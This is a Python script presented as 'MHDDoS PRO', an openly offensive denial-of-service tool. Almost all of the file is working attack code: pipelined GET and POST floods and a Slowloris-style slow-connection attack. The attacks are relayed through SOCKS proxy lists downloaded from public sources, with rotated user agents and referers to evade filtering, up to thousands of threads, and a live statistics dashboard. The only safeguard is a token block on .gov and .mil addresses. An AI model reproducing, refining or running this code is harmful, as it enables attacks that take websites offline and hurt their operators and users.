#!/usr/bin/python -tt
#Coded by DQV
#Ultra Powerful Version - MHDDoS PRO
#########################################
#      ULTIMATE DDoS ATTACK TOOL       #
#         Maximum Power Mode            #
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import urllib.parse
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

print(f'''{Fore.RED}
                __                      _____
               / /  __ _ _   _  ___ _ _|___  |
              / /  / _` | | | |/ _ \ '__| / /
             / /__| (_| | |_| |  __/ |   / /
             \____/\__,_|\__, |\___|_|  /_/
                          |___/
{Fore.YELLOW}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ MHDDoS PRO - MAXIMUM POWER MODE
~~~ Ultra-Fast Layer 7 DDoS Attack Tool
{Fore.CYAN}~~~ Coded by: DQV (Ultimate Edition)
{Fore.YELLOW}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{Style.RESET_ALL}''')

# ========== ADVANCED CONFIGURATION ==========
CONFIG = {
    'timeout': 3,  # Giảm timeout để tấn công nhanh hơn
    'max_retries': 5,
    'buffer_size': 8192,
    'thread_pool_size': 500,
    'request_batch': 50,  # Gửi 50 request cùng lúc
    'connection_keep_alive': True,
    'enable_pipeline': True,  # HTTP Pipelining
    'use_compression': True,
}

# ========== ADVANCED HEADERS FOR MAXIMUM IMPACT ==========
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9,pt;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: application/json, text/javascript, */*; q=0.01\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://check-host.net/",
    "https://www.reddit.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.twitter.com/",
    "https://www.pinterest.com/",
]

# ========== GLOBAL VARIABLES ==========
ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
proxies = []
target = ""
path = "/"
port = 80
protocol = "http"

Intn = random.randint
Choice = random.choice

# ========== ULTRA STATS CLASS ==========
class UltraStats:
    def __init__(self):
        self.start_time = time.time()
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.max_rps = 0
    
    def add_request(self, bytes_sent=0):
        with self.lock:
            self.requests_sent += 1
            self.bytes_sent += bytes_sent
    
    def add_error(self):
        with self.lock:
            self.errors += 1
    
    def get_stats(self):
        elapsed = max(time.time() - self.start_time, 0.1)
        rps = self.requests_sent / elapsed
        self.max_rps = max(self.max_rps, rps)
        mbps = (self.bytes_sent / elapsed) / (1024 * 1024)
        return {
            'requests': self.requests_sent,
            'bytes': self.bytes_sent,
            'errors': self.errors,
            'elapsed': elapsed,
            'rps': rps,
            'mbps': mbps,
            'max_rps': self.max_rps
        }

stats = UltraStats()

# ========== ENHANCED USER AGENT GENERATOR ==========
def getuseragent():
    """Generate realistic user agents"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]
    return Choice(user_agents)

# ========== RANDOM URL GENERATOR ==========
def randomurl():
    """Generate random URL with parameters"""
    params = ''.join([Choice(strings) for _ in range(20)])
    return params

# ========== PARSE URL ==========
def ParseUrl(original_url):
    """Parse URL and extract components"""
    global target, path, port, protocol
    
    original_url = original_url.strip()
    path = "/"
    port = 80
    protocol = "http"
    
    if original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
        port = 443
    elif original_url[:7] == "http://":
        url = original_url[7:]
    else:
        url = original_url
    
    tmp = url.split("/", 1)
    website = tmp[0]
    
    if ":" in website:
        parts = website.split(":")
        target = parts[0]
        port = int(parts[1])
    else:
        target = website
    
    if len(tmp) > 1:
        path = "/" + tmp[1]

# ========== ULTRA FAST GET ATTACK ==========
def cc_ultra(event, socks_type, ind_rlock):
    """ULTRA FAST GET Flood - Maximum Power"""
    global ind_dict
    
    event.wait()
    
    while True:
        try:
            proxy = Choice(proxies).strip().split(":")
            s = socks.socksocket()
            
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
            else:
                s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            
            s.settimeout(CONFIG['timeout'])
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            add = "&" if "?" in path else "?"
            
            # ===== HTTP PIPELINING - Gửi nhiều request cùng lúc =====
            if CONFIG['enable_pipeline']:
                requests_batch = []
                for _ in range(CONFIG['request_batch']):
                    header = (
                        f"GET {path}{add}{randomurl()} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {getuseragent()}\r\n"
                        f"Referer: {Choice(referers)}{target}{path}\r\n"
                        f"{Choice(acceptall)}"
                        f"Connection: Keep-Alive\r\n"
                        f"Cache-Control: no-cache\r\n"
                    )
                    if cookies:
                        header += f"Cookie: {cookies}\r\n"
                    header += "\r\n"
                    requests_batch.append(header)
                
                # Gửi batch requests
                batch_data = "".join(requests_batch).encode('utf-8')
                sent = s.send(batch_data)
                
                if sent:
                    stats.add_request(sent)
                    ind_rlock.acquire()
                    proxy_key = f"{proxy[0]}:{proxy[1]}"
                    ind_dict[proxy_key] = ind_dict.get(proxy_key, 0) + CONFIG['request_batch']
                    ind_rlock.release()
            else:
                for _ in range(20):
                    header = (
                        f"GET {path}{add}{randomurl()} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {getuseragent()}\r\n"
                        f"Referer: {Choice(referers)}{target}{path}\r\n"
                        f"{Choice(acceptall)}"
                        f"Connection: Keep-Alive\r\n"
                        f"Cache-Control: no-cache\r\n"
                    )
                    if cookies:
                        header += f"Cookie: {cookies}\r\n"
                    header += "\r\n"
                    
                    sent = s.send(header.encode('utf-8'))
                    if sent:
                        stats.add_request(sent)
                        ind_rlock.acquire()
                        proxy_key = f"{proxy[0]}:{proxy[1]}"
                        ind_dict[proxy_key] = ind_dict.get(proxy_key, 0) + 1
                        ind_rlock.release()
            
            s.close()
        except Exception as e:
            stats.add_error()
            try:
                s.close()
            except:
                pass

# ========== ULTRA FAST POST ATTACK ==========
def post_ultra(event, socks_type, ind_rlock):
    """ULTRA FAST POST Flood"""
    global ind_dict, data
    
    event.wait()
    
    while True:
        try:
            proxy = Choice(proxies).strip().split(":")
            s = socks.socksocket()
            
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
            else:
                s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            
            s.settimeout(CONFIG['timeout'])
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            if CONFIG['enable_pipeline']:
                requests_batch = []
                for _ in range(CONFIG['request_batch']):
                    post_data = data if data else f"id={Intn(1, 999999)}&data={randomurl()}"
                    header = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {getuseragent()}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(post_data)}\r\n"
                        f"Referer: {Choice(referers)}{target}{path}\r\n"
                        f"{Choice(acceptall)}"
                        f"Connection: Keep-Alive\r\n"
                        f"Cache-Control: no-cache\r\n"
                    )
                    if cookies:
                        header += f"Cookie: {cookies}\r\n"
                    header += f"\r\n{post_data}\r\n"
                    requests_batch.append(header)
                
                batch_data = "".join(requests_batch).encode('utf-8')
                sent = s.send(batch_data)
                
                if sent:
                    stats.add_request(sent)
                    ind_rlock.acquire()
                    proxy_key = f"{proxy[0]}:{proxy[1]}"
                    ind_dict[proxy_key] = ind_dict.get(proxy_key, 0) + CONFIG['request_batch']
                    ind_rlock.release()
            
            s.close()
        except Exception as e:
            stats.add_error()
            try:
                s.close()
            except:
                pass

# ========== HYPER SLOW ATTACK ==========
def slow_ultra(event, conn, socks_type, ind_rlock):
    """HYPER SLOW Attack - Giữ connections lâu"""
    socket_list = []
    
    event.wait()
    
    while True:
        # Tạo kết nối mới
        while len(socket_list) < conn:
            try:
                proxy = Choice(proxies).strip().split(":")
                s = socks.socksocket()
                
                if socks_type == 4:
                    s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
                else:
                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                
                s.settimeout(CONFIG['timeout'])
                s.connect((target, port))
                
                if protocol == "https":
                    ctx = ssl.SSLContext()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                
                # Gửi request ban đầu (không hoàn chỉnh)
                header = (
                    f"GET {path}?{randomurl()} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {getuseragent()}\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                )
                s.send(header.encode('utf-8'))
                socket_list.append({'socket': s, 'proxy': f"{proxy[0]}:{proxy[1]}"})
                
                ind_rlock.acquire()
                ind_dict[f"{proxy[0]}:{proxy[1]}"] = ind_dict.get(f"{proxy[0]}:{proxy[1]}", 0) + 1
                ind_rlock.release()
            except:
                pass
        
        # Gửi keep-alive packets
        for sock_info in list(socket_list):
            try:
                s = sock_info['socket']
                s.send(f"X-a: {Intn(1, 5000)}\r\n".encode('utf-8'))
                stats.add_request()
            except:
                socket_list.remove(sock_info)
                try:
                    s.close()
                except:
                    pass
        
        time.sleep(0.1)

# ========== ULTRA DISPLAY STATS ==========
def display_ultra_stats(ind_rlock):
    """Display ULTRA detailed statistics"""
    sp_chars = ["|", "/", "-", "\\"]
    i = 0
    
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"\n{Fore.LIGHTRED_EX}{'╔' + '═'*68 + '╗':^70}")
            print(f"{'║' + 'MHDDOS PRO - ULTRA ATTACK STATISTICS'.center(68) + '║':^70}")
            print(f"{'╚' + '═'*68 + '╝':^70}{Style.RESET_ALL}\n")
            
            stat = stats.get_stats()
            
            print(f"{Fore.LIGHTGREEN_EX}{'━' * 70}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}┌─ 📊 ATTACK METRICS{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Total Requests.........: {Fore.LIGHTYELLOW_EX}{stat['requests']:,}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Bytes Sent.............: {Fore.LIGHTYELLOW_EX}{stat['bytes']:,} bytes ({stat['mbps']:.2f} MB/s){Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Current RPS............: {Fore.LIGHTCYAN_EX}{stat['rps']:.0f} req/s{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Max RPS................: {Fore.LIGHTCYAN_EX}{stat['max_rps']:.0f} req/s{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Errors.................: {Fore.LIGHTRED_EX}{stat['errors']:,}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Elapsed Time...........: {Fore.LIGHTYELLOW_EX}{stat['elapsed']:.2f}s{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}└─────────────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}┌─ 🎯 TARGET INFO{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Host...................: {Fore.LIGHTYELLOW_EX}{target}:{port}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Path...................: {Fore.LIGHTYELLOW_EX}{path}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}│{Style.RESET_ALL} Protocol................: {Fore.LIGHTYELLOW_EX}{protocol.upper()}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}└─────────────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
            
            print(f"{Fore.YELLOW}{'TOP 15 PROXY PERFORMANCE':^70}")
            print(f"{Fore.LIGHTGREEN_EX}{'─'*70}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'#':<3} {'IP:PORT':<30} {'RPS':<15} {'STATUS':<22}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTGREEN_EX}{'─'*70}{Style.RESET_ALL}")
            
            ind_rlock.acquire()
            top15 = sorted(ind_dict.items(), key=lambda x: x[1], reverse=True)[:15]
            
            for idx, (proxy, rps) in enumerate(top15, 1):
                status = f"{Fore.LIGHTGREEN_EX}✓ Active{Style.RESET_ALL}" if rps > 0 else f"{Fore.LIGHTRED_EX}✗ Idle{Style.RESET_ALL}"
                print(f"{idx:<3} {proxy:<30} {rps:<15} {status:<22}")
                ind_dict[proxy] = 0
            
            ind_rlock.release()
            
            print(f"{Fore.LIGHTGREEN_EX}{'─'*70}{Style.RESET_ALL}\n")
            print(f"{Fore.LIGHTRED_EX}{sp_chars[i]:^70}")
            print(f"{'ATTACK IN PROGRESS...':^70}{Style.RESET_ALL}")
            
            i = (i + 1) % len(sp_chars)
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except Exception as e:
            time.sleep(1)

# ========== DOWNLOAD PROXIES ==========
def downloadsocks(choice):
    """Download proxy list từ nhiều sources"""
    print(f"\n{Fore.CYAN}[*] Downloading proxies from multiple sources...{Style.RESET_ALL}\n")
    
    filename = f"socks{choice}.txt"
    
    sources = [
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://spys.me/socks.txt",
    ]
    
    with open(filename, 'wb') as f:
        for idx, source in enumerate(sources, 1):
            try:
                r = requests.get(source, timeout=5)
                f.write(r.content)
                print(f"{Fore.LIGHTGREEN_EX}[+] [{idx}/{len(sources)}] Downloaded from {source}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[-] [{idx}/{len(sources)}] Failed to download from {source}{Style.RESET_ALL}")
    
    print(f"\n{Fore.LIGHTGREEN_EX}[+] Proxies saved to {filename}{Style.RESET_ALL}")

# ========== BUILD THREADS ==========
def build_threads(mode, thread_num, event, socks_type, ind_rlock):
    """Create and start attack threads"""
    if mode == "post":
        target_func = post_ultra
    elif mode == "slow":
        target_func = slow_ultra
    else:
        target_func = cc_ultra
    
    if mode == "slow":
        th = threading.Thread(target=target_func, args=(event, thread_num, socks_type, ind_rlock))
        th.daemon = True
        th.start()
    else:
        for _ in range(thread_num):
            th = threading.Thread(target=target_func, args=(event, socks_type, ind_rlock))
            th.daemon = True
            th.start()

# ========== MAIN ==========
def main():
    global proxies, data, cookies
    
    print(f"\n{Fore.LIGHTMAGENTA_EX}{'='*70}")
    print(f"{'Available Attack Modes:'.center(70)}")
    print(f"  • cc (Ultra GET Flood - Mạnh nhất)")
    print(f"  • post (Ultra POST Flood)")
    print(f"  • slow (Hyper Slow Attack - Giữ connections)")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    mode = input(f"{Fore.CYAN}[?] Choose attack mode (default=cc): {Style.RESET_ALL}").lower().strip() or "cc"
    url = input(f"{Fore.CYAN}[?] Target URL (example: http://target.com): {Style.RESET_ALL}").strip()
    
    if not url:
        print(f"{Fore.LIGHTRED_EX}[!] URL cannot be empty!{Style.RESET_ALL}")
        return
    
    if '.gov' in url or '.mil' in url:
        print(f"{Fore.LIGHTRED_EX}[!] Cannot attack government/military websites!{Style.RESET_ALL}")
        return
    
    ParseUrl(url)
    
    choice = input(f"{Fore.CYAN}[?] SOCKS type (4/5, default=5): {Style.RESET_ALL}").strip() or "5"
    socks_type = 4 if choice == "4" else 5
    
    download = input(f"{Fore.CYAN}[?] Download proxies? (y/n, default=y): {Style.RESET_ALL}").lower() or "y"
    if download == "y" or download == "yes":
        downloadsocks(choice)
    
    proxy_file = f"socks{choice}.txt"
    
    try:
        proxies = open(proxy_file).readlines()
        print(f"{Fore.LIGHTGREEN_EX}[+] Loaded {len(proxies)} proxies{Style.RESET_ALL}")
    except:
        print(f"{Fore.LIGHTRED_EX}[!] Proxy file not found: {proxy_file}{Style.RESET_ALL}")
        return
    
    thread_num = int(input(f"{Fore.CYAN}[?] Number of threads (default=1000, recommended=5000): {Style.RESET_ALL}") or "1000")
    
    if len(proxies) == 0:
        print(f"{Fore.LIGHTRED_EX}[!] No proxies loaded!{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.LIGHTGREEN_EX}{'='*70}")
    print(f"{'ATTACK CONFIGURATION':^70}")
    print(f"{'='*70}")
    print(f"Target.................: {Fore.LIGHTYELLOW_EX}{target}:{port}{Style.RESET_ALL}")
    print(f"Protocol................: {Fore.LIGHTYELLOW_EX}{protocol.upper()}{Style.RESET_ALL}")
    print(f"Attack Mode.............: {Fore.LIGHTYELLOW_EX}{mode.upper()}{Style.RESET_ALL}")
    print(f"Threads.................: {Fore.LIGHTYELLOW_EX}{thread_num}{Style.RESET_ALL}")
    print(f"Proxies.................: {Fore.LIGHTYELLOW_EX}{len(proxies)}{Style.RESET_ALL}")
    print(f"HTTP Pipelining.........: {Fore.LIGHTYELLOW_EX}{'ENABLED' if CONFIG['enable_pipeline'] else 'DISABLED'}{Style.RESET_ALL}")
    print(f"Batch Size..............: {Fore.LIGHTYELLOW_EX}{CONFIG['request_batch']}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX}{'='*70}{Style.RESET_ALL}\n")
    
    ind_rlock = threading.RLock()
    event = threading.Event()
    
    print(f"{Fore.LIGHTCYAN_EX}[*] Building {thread_num} threads...{Style.RESET_ALL}")
    build_threads(mode, thread_num, event, socks_type, ind_rlock)
    
    print(f"{Fore.LIGHTGREEN_EX}[+] All threads ready!{Style.RESET_ALL}")
    input(f"\n{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start the attack...{Style.RESET_ALL}")
    
    event.set()
    print(f"\n{Fore.LIGHTRED_EX}{'🔥 ATTACK STARTED! 🔥':^70}{Style.RESET_ALL}\n")
    
    threading.Thread(target=display_ultra_stats, args=(ind_rlock,), daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.LIGHTYELLOW_EX}{'='*70}")
        print(f"{'ATTACK STOPPED':^70}")
        stat = stats.get_stats()
        print(f"{'='*70}")
        print(f"Total Requests: {stat['requests']:,}")
        print(f"Total Bytes: {stat['bytes']:,}")
        print(f"Average RPS: {stat['rps']:.0f}")
        print(f"Max RPS: {stat['max_rps']:.0f}")
        print(f"{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[!] Error: {e}{Style.RESET_ALL}")